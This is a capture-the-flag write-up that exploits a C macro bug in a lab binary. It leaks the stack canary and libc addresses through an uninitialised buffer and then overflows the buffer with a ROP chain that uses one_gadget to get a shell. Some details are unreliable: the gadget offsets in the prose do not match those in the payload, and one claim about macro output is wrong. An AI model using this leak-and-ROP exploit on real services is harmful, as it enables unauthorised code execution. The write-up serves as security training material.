# Question of Defineition

## Recon

### `checksec`

Before starting lets have a look at `checksek` to see what kind of challeng this is going to be
```
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
Stripped:   No
```

Analysis:
- `NX enabled`: we probably need to construct a ROP chain
- `Canary found`: we probably need to leak that
- `PIE enabled`: we probably need to leak some addresses


### `vuln.c`

If we take a look at the C code we notice that we have 6 commands:

- `i` to send `2` bytes to `global_buf`
- `o` to print the `global_buf`
- `l` to copy a part of `local_buf` to `global_buf`
- `g` to copy a part of `global_buf` to `local_buf`
- `f` to copy all of `global_buf` to `local_buf`
- `q` to quit the program (using a return !)


We are also working with 2 buffers:
- `char global_buf[BUFSIZ / 8]`
- `char local_buf[BUFH][BUFW]`

We are lead to believe these buffers are both 240 bytes long.

However, one of the first apparent things is that this program uses a lot of macros..


## On C macros

The thing with C macros is that they can be quite tricky to get right notably because of missing parenthesis.

```c
#include "stdio.h"

#define ADD(a, b) a + b
#define MUL(a, b) a * b

int main(void) {
    printf("%d", MUL(ADD(0, 1), ADD(2, 3)));
    return 0;
}
```

The result is $0 + (1 \times 2) + 3 = 5$ and not $(0 + 1) \times (3 + 2) = 6$.

Another issue is that macros can be ovewritten by other files if they are defined before the includes:

```c
#define NULL 1

#include "stdio.h"

int main(void) {
    printf("%d", NULL);
    return 0;
}
```

This will print 0. (Overwritting NULL is )

To expand all macros, we can use `gcc -E`.

## Anlysing the code

Let's have a look at `vuln.e.c` (created using `gcc -E vuln.c -o vuln.e.c`). Here are some extracts:

```c
char global_buf[8192 / 8]; // 1024
```
Thats a tiny bit more than 240..

```c
char local_buf[21 + 3][10];         // 240
memset(local_buf, 0, 21 + 3 * 10);  //  51
```
This buffer is not being initialized proprely, there are 189 uninitialized bytes


Copying the unitialized `local_buf` to `global_buf` with the `l` command then printing the `global_buf` with the `o` command allows us to leak information that was on the stack.

The copying `global_buf` into `local_buf` with the `f` command creates a buffer overflow.

## Creating the proper binary

To get everything working proprely, I downloaded the `ld-linux-x86-64.so.2` and `libc.so.6` binaries from the docker image. Then patched the binary:

```
$ patchelf --set-interpreter ./ld-linux-x86-64.so.2 vuln_patched
$ patchelf --set-rpath . vuln
```

## Leaking data

Let's see what data resides in the unitialized bytes. To do so, we will send data to the `global_buffer` up to the size where we want to read, copy that data to the `local_buffer` with `g`, copy the `local_buffer` back to the `global_buffer` with `l` and finally display the `global_buffer` with `o`.

My script reads from an offset to the END of `local_buffer`.

> This strategy only allows us to read decreasing offsets as we are writting all the bytes up to the last `offset` ones every time

```python
def leak_addr(offset):
    sz = 240 - offset
    TARGET.recvuntil(PROMPT, timeout=1)
    TARGET.sendline(b"i")

    TARGET.recvuntil(PROMPT, timeout=1)
    TARGET.sendline(b"A" * sz)

    TARGET.recvuntil(PROMPT, timeout=1)
    TARGET.sendline(b"g")

    TARGET.recvuntil(PROMPT, timeout=1)
    TARGET.sendline(b"l")

    TARGET.recvuntil(PROMPT, timeout=1)
    TARGET.sendline(b"o")

    l = TARGET.recvuntil(PROMPT, timeout=1)

    print(l)
    l = l[sz + 1 : -len(PROMPT)]
    return l
```

To know what to leak, in gdb we can do `br run` then `ni 20` (to jump over some of the function prefix).

We can then print the stack to understand what we expect to find in `local_buffer` with `hexdump qword --size 0x40 $rsp` (I'm using GEF):

```
0x00007fffffffcac0│+0x0000   0x0000000000000000
0x00007fffffffcac8│+0x0008   0x0000000000000000
0x00007fffffffcad0│+0x0010   0x0000000000000000
0x00007fffffffcad8│+0x0018   0x0000000000000000
0x00007fffffffcae0│+0x0020   0x0000000000000000
0x00007fffffffcae8│+0x0028   0x0000000000000000
0x00007fffffffcaf0│+0x0030   0x0000000000000000
0x00007fffffffcaf8│+0x0038   0x0000000000000001
0x00007fffffffcb00│+0x0040   0x000000000000000a
0x00007fffffffcb08│+0x0048   0x000055555555601b
0x00007fffffffcb10│+0x0050   0x0000555555558080
0x00007fffffffcb18│+0x0058   0x00007ffff7fb15e0
0x00007fffffffcb20│+0x0060   0x00007ffff7ffd020
0x00007fffffffcb28│+0x0068   0x00007ffff7e63fd9
0x00007fffffffcb30│+0x0070   0x00007ffff7fb5760
0x00007fffffffcb38│+0x0078   0x00007ffff7e643e3
0x00007fffffffcb40│+0x0080   0x0000000000000010
0x00007fffffffcb48│+0x0088   0x00007ffff7fb5760
0x00007fffffffcb50│+0x0090   0x000055555555601b
0x00007fffffffcb58│+0x0098   0x00007ffff7e59ada
0x00007fffffffcb60│+0x00a0   0x0000000000000000
0x00007fffffffcb68│+0x00a8   0x0000000000000000
0x00007fffffffcb70│+0x00b0   0x00007fffffffcd18
0x00007fffffffcb78│+0x00b8   0x0000000000000001
0x00007fffffffcb80│+0x00c0   0x0000000000000000
0x00007fffffffcb88│+0x00c8   0x00007fffffffcd28
0x00007fffffffcb90│+0x00d0   0x0000000000000000
0x00007fffffffcb98│+0x00d8   0x0000555555555480
0x00007fffffffcba0│+0x00e0   0x0000000000000001
0x00007fffffffcba8│+0x00e8   0x1494119dae1a6e00
0x00007fffffffcbb0│+0x00f0   0x00007fffffffcd28
0x00007fffffffcbb8│+0x00f8   0x1494119dae1a6e00
```

`local_buf` is 240 bytes long so ends at `0x00007fffffffcbb0`. We notice the initial 51 bytes set to 0.

It also appears the last 8 bytes (offset -8) of `local_buf` are the canary and that the bytes at `0x00007fffffffcb38` (offset -121) is in the lib C.

We can check with
```
gef➤  x/i 0x00007ffff7e643e3
   0x7ffff7e643e3 <_IO_file_overflow+259>:      cmp    eax,0xffffffff
```

We can therefore leak the canary and libc addresses

## Creating a ROP chain

I tried using `pwntool`'s `execve` command to no avail so let's try `one_gadget`:

```
$ one_gadget libc.so.6
0x4c140 posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
constraints:
  address rsp+0x60 is writable
  rsp & 0xf == 0
  rcx == NULL || {rcx, rax, r12, NULL} is a valid argv
  rbx == NULL || (u16)[rbx] == NULL
```

Using `pwntools`, we find a gadget for `rax`:

```
Gadget(0x3f197, ['pop rax', 'ret'], ['rax'], 0x8)
```

and one for `rbx`:

```
Gadget(0x319ad, ['pop rbx', 'ret'], ['rbx'], 0x8)
```

Here is our final paiload:

```python
def mk_payload(canary, libc_base):
    ONE_GADGET = 0xD509F + libc_base

    POP_RAX = 0x277E5 + libc_base
    POP_RBX = 0x29830 + libc_base

    return (
        b"A" * 248  # padding until the canary
        + canary
        + b"A" * 0x28   # padding until the return address
        + p64(POP_RAX)
        + p64(0)  # value of rax
        + p64(POP_RBX)
        + p64(0)  # value of rbx
        + p64(ONE_GADGET)
    )
```

## Putting it all together

We can now send the payload with `i` then copy the hole thing with `f` which should overwrite the return address. Calling the exit command with `q` should call our ROP chain.


Flag:
```
ECW{c-define-considered-harmful-f97f6c791eb8de51}
```